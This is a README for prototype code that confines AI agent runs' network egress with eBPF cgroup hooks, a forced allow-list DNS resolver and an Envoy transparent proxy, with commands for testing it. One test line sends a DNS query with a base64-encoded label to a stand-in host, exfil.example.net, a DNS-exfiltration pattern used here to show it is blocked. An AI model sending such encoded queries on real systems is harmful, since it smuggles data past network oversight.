# Phase 3 milestone 3.0 spikes

Throwaway code that answered the 3.0 questions in
[the design doc](../../docs/agent-egress-design.md#30-spike-results-2026-11-22).
It is a separate Go module, like `spikes/phase2`. Not production code.

| Path | What it shows |
|---|---|
| `bpf/transparent.c` | Redirect-or-deny for run cgroups: `connect4/6`, `sendmsg4/6`, `recvmsg4/6`, `getpeername4/6`, `bind4/6` and `sockops` on `agents/`, and `cgroup/getsockopt` answering `SO_ORIGINAL_DST` for the proxy. Heartbeat fail closed, same-run loopback, UDP 53 to a local resolver. |
| `tproxy/` | Loads and attaches it, writes the heartbeat, prints verdicts. `SIGUSR1` stops the heartbeat; `SIGUSR2` restarts it. |
| `probe/` | Stands in for Envoy: prints `SO_ORIGINAL_DST` and the client's cgroup for each connection. |
| `resolver/` | Forced resolver: run identity from UDP and TCP socket diagnostics, NXDOMAIN outside an allow list, `ech` stripped from HTTPS and SVCB answers. |
| `sockdiag/` | The Phase 2 lookup with the protocol as a parameter. For UDP the argument order is reversed (see the comment). |
| `envoy/transparent.yaml` | Transparent listener: `original_dst`, TLS and HTTP inspectors; TLS tunnelled as `CONNECT <SNI>:<port>` into an internal listener, plain HTTP by `Host`, other TCP by original IP; self-destined connections refused. |
| `uring/connect.c` | One `IORING_OP_CONNECT` without liburing, to show it passes the hooks. |

## Running

Root, cgroup v2 with `/sys/fs/cgroup/agents`, clang, Docker. The node agent
need not run: the tests make `agents/run-spike` by hand.

```sh
clang -target bpf -g -O2 -Wall -I/usr/include/$(uname -m)-linux-gnu \
  -c bpf/transparent.c -o bpf/transparent.o
go build -o /tmp/p3/ ./...
sudo mkdir /sys/fs/cgroup/agents/run-spike
sudo /tmp/p3/tproxy -obj bpf/transparent.o &
/tmp/p3/resolver -allow example.com,github.com &
sudo docker run -d --name p3envoy --network host -v $PWD/envoy:/cfg:ro \
  --entrypoint envoy envoyproxy/envoy:v1.34.14 -c /cfg/transparent.yaml

# Run a command inside the run cgroup, as yourself:
inrun() { sudo sh -c 'echo $$ > /sys/fs/cgroup/agents/run-spike/cgroup.procs &&
  exec setpriv --reuid='"$(id -u)"' --regid='"$(id -g)"' --init-groups -- "$@"' sh "$@"; }
inrun curl --noproxy '*' https://example.com/        # through Envoy
inrun curl --resolve example.com:443:1.1.1.1 https://example.com/  # still example.com
inrun python3 -c 'import socket; socket.socket(2,2).sendto(b"x",("8.8.8.8",443))'  # EPERM
inrun dig @1.1.1.1 aGVsbG8.exfil.example.net         # NXDOMAIN, from "1.1.1.1"
sudo pkill -USR1 -f 'bin/tprox[y]'; sleep 4; inrun curl https://example.com/  # EPERM
```
